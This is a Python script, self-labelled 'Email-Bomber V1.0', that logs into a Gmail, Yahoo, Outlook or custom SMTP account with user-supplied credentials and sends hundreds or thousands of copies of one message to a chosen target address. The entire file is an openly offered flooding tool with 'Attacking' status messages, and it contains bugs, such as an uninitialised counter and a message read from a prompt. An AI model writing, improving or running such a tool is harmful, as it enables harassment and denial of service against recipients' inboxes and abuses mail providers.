import smtplib
import sys

class Bcolor():
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    
def banner():
    print(Bcolor.GREEN + """
 +[+[+[ Email-Bomber V1.0 ]+]+]+
 +[+[+[ made by The Zero-Day Zone ]+]+]+
          
                                    |
Email-Bomber V 01.0                 |
by Zone                             |
                                  .-'-.
                                 ' ___ '
                       ---------'  .-.  '---------
       _________________________'  '-'  '_________________________
        ''''''-|---|--/    \==][^',_m_,'^][==/    \--|---|-''''''
                      \    /  ||/   H   \||  \    /
                       '--'   OO   O|O   OO   '--'
**====================================================================** """)

class Email_Bomber():
    
    def __init__(self):
        try:
            print(Bcolor.RED + r"""
           +[+[+[ Initializing Program ]+]+]+
            """)
            self.target = input(Bcolor.YELLOW + 'Enter your target <<<: ')
            self.mode = int(input(Bcolor.YELLOW + '''
Enter BOMB mode (1, 2, 3, 4) ||
1:(1000)   :
2:(500)    :
3:(250)    : 
4:(Custom) :  <<<: '''))
            if not (1 <= self.mode <= 4):
                print(Bcolor.RED + 'ERROR : Invalid Option. Goodbye.')
                sys.exit(1)

        except Exception as e:
            print(Bcolor.RED + f"[-] Error during initialization: {str(e)}")

    def bomb(self):
        try:
            print(Bcolor.RED + r"""
           +[+[+[ Setting up Bomber ]+]+]+
            """)
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(Bcolor.YELLOW + 'Enter your Custom amount <<<: '))

            print(Bcolor.GREEN + f"+[+[+[ you have selected Bomb mode: {self.mode} and {self.amount} emails ]+]+]+")

        except Exception as e:
            print(Bcolor.RED + f"[-] Error during initialization: {str(e)}")

    def email(self):
        try:
            print(Bcolor.RED + r"""
           +[+[+[ Setting up Email ]+]+]+
            """)
            self.server = input(Bcolor.YELLOW + """
Enter email server / or select premade options :
1 : Gmail
2 : Yahoo
3 : Outlook >>> : """)
            premade = ['1', '2', '3']
            default_port = True

            if self.server not in premade:
                default_port = False
                self.port = int(input(Bcolor.YELLOW + "Enter your Port <<< : "))

            if default_port:
                self.port = 587

            if self.server == '1':
                self.server = "smtp.gmail.com"
            elif self.server == '2':
                self.server = "smtp.mail.yahoo.com"
            elif self.server == '3':
                self.server = "smtp-mail.outlook.com"

            self.formAddr = input(Bcolor.YELLOW + "Enter your Username or address <<< : ")
            self.formPwd = input(Bcolor.YELLOW + "Enter your password <<< : ")
            self.Subject = input(Bcolor.YELLOW + "Enter your subject <<< : ")
            self.message = input(Bcolor.YELLOW + "Enter your message <<< : ")
            self.msg = input(Bcolor.YELLOW + f"""
From    : {self.formAddr}
To      : {self.target}
Subject : {self.Subject}
          {self.message} """)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.formAddr, self.formPwd)

        except Exception as e:
            print(Bcolor.RED + f"[-] Error during initialization: {str(e)}")

    def send(self):
        try:
            print(Bcolor.RED + f"\n +[+[+[ Sending emails to {self.target} ]+]+]+")
            self.s.sendmail(self.formAddr, self.target, self.msg)
            self.count += 1
            print(Bcolor.GREEN + f"\n +[+[+[ {self.count} emails sent successfully ]+]+]+ \n")

        except Exception as e:
            print(Bcolor.RED + f"[-] Error during email bombing: {str(e)}")

    def attack(self):
        print(Bcolor.RED + f"\n +[+[+[ Attacking..... ]+]+]+ \n")

        for email in range(self.amount):
            self.send()

        self.s.quit()
        print(Bcolor.RED + f"\n +[+[+[ Attack Finished.... ]+]+]+ \n")
        sys.exit(0)

if __name__ == "__main__":
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
